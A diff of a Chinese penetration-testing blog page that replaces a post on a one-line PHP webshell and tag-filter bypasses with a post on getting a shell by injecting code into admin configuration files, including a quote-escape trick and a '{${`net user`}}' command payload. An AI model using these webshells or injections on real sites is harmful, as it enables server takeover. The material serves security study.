@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>一个php木马引发的xxoo | FreeV&#39;s Blog</title>
+  <title>后台配置getshell总结 | FreeV&#39;s Blog</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -229,53 +229,40 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2016-01-30T01:27:25.000Z" itemprop="datePublished">
-          2016-01-30
+      <time datetime="2016-02-06T11:03:24.000Z" itemprop="datePublished">
+          2016-02-06
       </time>
     
     
     | 
-    <a href='/tags/php代码安全/'>php代码安全</a>
+    <a href='/tags/渗透技巧/'>渗透技巧</a>
     
     
 </span>
-                <h1>一个php木马引发的xxoo</h1>
+                <h1>后台配置getshell总结</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
       		<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
-<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line">&lt;% <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`%&gt;</span></span><br></pre></td></tr></table></figure>
-<p><br></p>
-<h2 id="0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E"><a href="#0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E" class="headerlink" title="0x01 可执行php代码的标签"></a>0x01 可执行php代码的标签</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="var_expand">% echo <span class="escape">`$</span>_GET[1]<span class="escape">`%</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p></p><h4>需要开启asp_tags=On<p></p>
-<p></p><h4>php3可以通过 short_tags() 函数激活使用短标签 <p></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span> phpinfo()<span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p></p><h4>需要在phpini中开启shor_tags()<p></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">language</span>=<span class="value">"php"</span>&gt;</span><span class="undefined"></span><br><span class="line">echo phpinfo;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p></p><h4>通过js执行php代码<p></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span></span><br></pre></td></tr></table></figure>
-<p></p><h4>这里‘=’相当于echo<p></p>
-<h2 id="0x02__u603B_u7ED3"><a href="#0x02__u603B_u7ED3" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p></p><h4>闭合标签可以不必要写，但是需要加上‘;’<p></p>
-<p></p><h4>以上php执行方式通常用于bypass绕过php执行标签<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br></pre></td></tr></table></figure><p></p>
-</h4></h4></h4></h4></h4></h4></h4>
+<h2 id="0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x00 配置文件单引号"></a>0x00 配置文件单引号</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">'1'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br><span class="line">   //利用反斜杠转义第二个单引号  利用‘//‘注释后面语句</span><br><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1\'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">';echo '</span><span class="number">1</span><span class="string">';//11'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x01__u914D_u7F6E_u6587_u4EF6_u53CC_u5F15_u53F7"><a href="#0x01__u914D_u7F6E_u6587_u4EF6_u53CC_u5F15_u53F7" class="headerlink" title="0x01 配置文件双引号"></a>0x01 配置文件双引号</h2><p></p><h4>利用php双引号特点<p></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">"&#123;$&#123;`net user`&#125;&#125;"</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">"utf-8"</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">"xx"</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'/a'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>//如果配置文件对敏感字符进行转义而没有对 ‘/’进行转义</p>
+<h2 id="0x02__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x02__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x02 配置文件单引号"></a>0x02 配置文件单引号</h2><h2 id="0x03__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x03__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x03 配置文件单引号"></a>0x03 配置文件单引号</h2></h4>
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="pagination" role="pagination">
     
-    <a class="pull-left" href="/2016/02/06/后台配置getshell总结/" style="float: left;">
-        ← 后台配置getshell总结
-    </a>
     
-    
-    <a class="pull-right" href="/2015/12/16/上传之万恶的zip/">
-        上传之万恶的zip →
+    <a class="pull-right" href="/2016/01/30/一个php木马引发的xxoo/">
+        一个php木马引发的xxoo →
     </a>
     
 </nav>
 
         <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/01/30/一个php木马引发的xxoo/" data-title="一个php木马引发的xxoo" data-url="http://yoursite.com/2016/01/30/一个php木马引发的xxoo/"></div>
+<div class="ds-thread" data-thread-key="2016/02/06/后台配置getshell总结/" data-title="后台配置getshell总结" data-url="http://yoursite.com/2016/02/06/后台配置getshell总结/"></div>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"freev"};
 (function() {
